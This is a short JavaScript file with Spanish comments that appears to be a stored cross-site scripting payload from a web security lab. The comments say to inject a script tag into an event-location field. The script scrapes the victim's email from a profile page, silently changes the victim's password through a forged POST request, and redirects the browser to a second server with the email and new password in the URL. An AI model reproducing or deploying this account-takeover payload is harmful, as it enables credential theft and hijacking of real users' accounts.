// Donde pone "introduce lugar del evento" hay que poner <script src="http://localhost:82/a.js"></script>
// Donde pone "introduce lugar del evento" hay que poner <script src="http://localhost:82/a.js"></script>
prom_correo = fetch('http://localhost:81/editarMiPerfil.php', {
    method: 'GET',
    headers: {
    },
})
.then(response => response.text())
.then(text => buscarCorreo(text))
function buscarCorreo(texto){
  var p = texto.indexOf('@')
  var correo = '';
  var i = 636
  while (texto[i]!=' '){
    correo = correo +texto[i]
    i = i+1
  }
  return correo
}
alert("Contraseña cambiada!")

// Solo dios sabe lo que hace esa regex, asi que en vez de
// averiguar lo que hace, vamos a generar una que creemos
// que funcionará y comprobarlo por si acaso
expr_contraseña = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[$@$!%*?&.])[A-Za-z\d$@$!%*?&.]{8,}$/
final_contraseña = "aA99!!"
var contraseña = ""
while (!contraseña.match(expr_contraseña)) {
    contraseña = ""
    var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    var charactersLength = characters.length
    for ( var i = 0; i < 20; i++ ) {
        contraseña += characters.charAt(Math.floor(Math.random() * charactersLength))
    }
    
    contraseña = contraseña + final_contraseña
}

let httpreq = new XMLHttpRequest()
httpreq.open("POST", "cambioContrasena.php")
httpreq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
let data = `contrase%C3%B1a=${contraseña}`
httpreq.send(data)

prom_correo.then(correo => {
    window.location = `http://localhost:82/a.php?usuario=${correo}&contrasena=${contraseña}`
})

console.log(contraseña)